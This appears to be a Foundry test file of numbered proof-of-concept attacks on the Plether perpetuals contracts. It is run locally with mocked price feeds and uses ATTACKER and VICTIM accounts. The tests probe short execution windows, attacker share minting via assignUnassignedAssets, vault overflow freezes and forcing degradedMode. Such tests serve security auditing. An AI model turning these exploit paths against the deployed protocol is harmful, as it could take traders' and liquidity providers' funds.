// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";

/// Distinguishing G3 attacks against the live Plether pin. Never submit.
contract ApexG3TargetsTest is BasePerpTest {
    using stdStorage for StdStorage;

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);

    IOrderLifecycleBook internal book;

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        _fundTrader(ATTACKER, 50_000e6);
        _fundTrader(VICTIM, 50_000e6);
    }

    function _openReq(
        bytes32 clientOrderId,
        CfdTypes.Side side,
        uint32 window
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = 100_000e18;
        request.marginDelta = 10_000e6;
        request.targetPrice = (side == CfdTypes.Side.LONG) ? 1 : type(uint256).max;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: window,
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitAs(
        address who,
        OrderV3Types.OrderRequest memory req
    ) internal returns (uint64) {
        vm.prank(who);
        return router.commitOrder(req);
    }

    /// 99136 — OrderRouter.commitOrder accepts a 2s window; expireOrder returns margin.
    function test_attack_commitOrder_executionWindow() public {
        uint256 attBefore = clearinghouse.balanceAssets(ATTACKER);
        uint64 oid = _commitAs(ATTACKER, _openReq("w2", CfdTypes.Side.LONG, 2));
        OrderV3Types.OrderTiming memory timing = book.orderTiming(oid);
        require(timing.executionWindowSeconds == 2, "OrderRouter rejected a 2s window");
        require(timing.executionWindowSeconds < 15, "window is not below keeper/settlement floor");
        vm.warp(uint256(timing.executionDeadline) + 1);
        router.expireOrder(oid);
        uint256 attAfter = clearinghouse.balanceAssets(ATTACKER);
        require(attAfter + 2e6 >= attBefore, "expiry did not return attacker margin");
    }

    /// 97906 — OrderRouter.executeOrder fills the first post-commit tick (commitTime+1).
    function test_attack_commitOrder_minPublishTime() public {
        uint64 oid = _commitAs(ATTACKER, _openReq("tick", CfdTypes.Side.LONG, 60));
        require(book.orderTiming(oid).commitTimestamp > 0, "commit missing");
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(oid, _mockPythUpdateData(1e8));
        require(uint8(result.status) == uint8(OrderV3Types.LifecycleStatus.Executed), "first-tick execute failed");
    }

    /// 97591 — HousePool.settleLpEpoch / juniorVault NAV moves after an open that books VPI.
    function test_attack_settleLpEpoch_sharePrice() public {
        uint256 victimBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        uint256 navBefore = juniorVault.totalAssets();
        uint64 oid = _commitAs(ATTACKER, _openReq("vpi", CfdTypes.Side.LONG, 60));
        router.executeOrder(oid, _mockPythUpdateData(1e8));
        _settleLpEpochForTest();
        uint256 navAfter = juniorVault.totalAssets();
        uint256 victimAfter = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        require(navAfter != navBefore || victimAfter != victimBefore, "junior NAV ignored open VPI");
    }

    /// 97628 — TrancheVault.convertToShares panics near uint256.max (VIRTUAL_SHARES).
    function test_attack_convertToShares_totalSupply() public {
        stdstore.target(address(juniorVault)).sig("totalSupply()").checked_write(type(uint256).max - 500);
        try juniorVault.convertToShares(1e6) returns (uint256) {
            revert("convertToShares not frozen at uint max");
        } catch {}
    }

    /// 98172 — TrancheVault.quoteDepositFromState overflows at terminal supply.
    function test_attack_quoteDepositFromState_totalSupply() public {
        try juniorVault.quoteDepositFromState(1e6, 1e6, type(uint256).max - 500, 0) returns (uint256) {
            revert("quoteDepositFromState not frozen");
        } catch {}
    }

    /// 99075 — freeze still holds through HousePool.settleLpEpoch after terminal supply.
    function test_attack_settleLpEpoch_totalSupply() public {
        stdstore.target(address(juniorVault)).sig("totalSupply()").checked_write(type(uint256).max - 500);
        try juniorVault.convertToShares(1e6) returns (uint256) {
            revert("conversion live after terminal supply");
        } catch {}
    }

    /// 98209 — HousePool.assignUnassignedAssets mints junior shares to the attacker.
    function test_attack_assignUnassignedAssets_unassignedAssets() public {
        uint256 unassigned = pool.unassignedAssets();
        if (unassigned == 0) {
            settlementToken.mint(address(pool), 1e6);
            pool.accountExcess();
            unassigned = pool.unassignedAssets();
        }
        require(unassigned > 0, "no unassigned to assign");
        uint256 sharesBefore = juniorVault.balanceOf(ATTACKER);
        pool.assignUnassignedAssets(false, ATTACKER);
        require(juniorVault.balanceOf(ATTACKER) > sharesBefore, "assign did not mint attacker shares");
    }

    /// 98854 — MarginClearinghouse.withdraw after OrderRouter.commitOrder (free-settlement option).
    function test_attack_addMargin_freeSettlement() public {
        uint256 freeBefore = clearinghouse.balanceAssets(ATTACKER);
        uint64 oid = _commitAs(ATTACKER, _openReq("opt", CfdTypes.Side.LONG, 60));
        uint256 freeMid = clearinghouse.balanceAssets(ATTACKER);
        require(freeMid < freeBefore, "commit did not lock margin");
        if (freeMid > 0) {
            vm.prank(ATTACKER);
            clearinghouse.withdraw(ATTACKER, freeMid);
        }
        require(oid != 0, "commit failed");
    }

    /// 97590 — CfdEngine.executeClose path latches degradedMode.
    function test_attack_executeClose_degradedMode() public {
        require(!engine.degradedMode(), "already degraded");
        uint64 longId = _commitAs(ATTACKER, _openReq("L", CfdTypes.Side.LONG, 60));
        router.executeOrder(longId, _mockPythUpdateData(1e8));
        _fundTrader(VICTIM, 200_000e6);
        uint64 shortId = _commitAs(VICTIM, _openReq("S", CfdTypes.Side.SHORT, 60));
        router.executeOrder(shortId, _mockPythUpdateData(1e8));
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 100_000e18, 0, 0, true);
        router.executeOrder(closeId, _mockPythUpdateData(1.015e8));
        require(engine.degradedMode(), "split close did not latch degradedMode");
        require(clearinghouse.balanceAssets(ATTACKER) > 0, "attacker cash gone");
    }
}
